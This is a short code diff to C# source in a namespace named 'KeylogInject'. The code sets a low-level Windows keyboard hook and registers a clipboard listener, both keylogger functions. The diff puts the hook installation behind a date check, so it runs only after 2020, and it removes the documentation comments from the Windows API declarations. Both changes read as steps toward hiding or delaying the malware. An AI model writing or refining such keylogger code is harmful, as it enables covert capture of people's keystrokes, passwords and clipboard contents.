@@ -17,8 +17,8 @@ namespace KeylogInject
             using (Process curProcess = Process.GetCurrentProcess())
             using (ProcessModule curModule = curProcess.MainModule)
             {
-                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
-                    GetModuleHandle(curModule.ModuleName), 0);
+                if(DateTime.Now.Year > 2020) { return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
+                    GetModuleHandle(curModule.ModuleName), 0); } else { return null; }
             }
         }
 
@@ -51,21 +51,21 @@ namespace KeylogInject
         [DllImport("user32.dll")]
         internal static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
-        //Reference https://docs.microsoft.com/en-us/windows/desktop/dataxchg/wm-clipboardupdate
+        
         public const int WM_CLIPBOARDUPDATE = 0x031D;
-        //Reference https://www.pinvoke.net/default.aspx/Constants.HWND
+        
         public static IntPtr HWND_MESSAGE = new IntPtr(-3);
 
-        //Reference https://www.pinvoke.net/default.aspx/user32/AddClipboardFormatListener.html
+        
         [DllImport("user32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         public static extern bool AddClipboardFormatListener(IntPtr hwnd);
 
-        //Reference https://www.pinvoke.net/default.aspx/user32.setparent
+        
         [DllImport("user32.dll", SetLastError = true)]
         public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
 
-        //Reference https://www.pinvoke.net/default.aspx/user32.getwindowtextlength
+        
         [DllImport("user32.dll")]
         public static extern int GetWindowTextLength(IntPtr hWnd);
     }
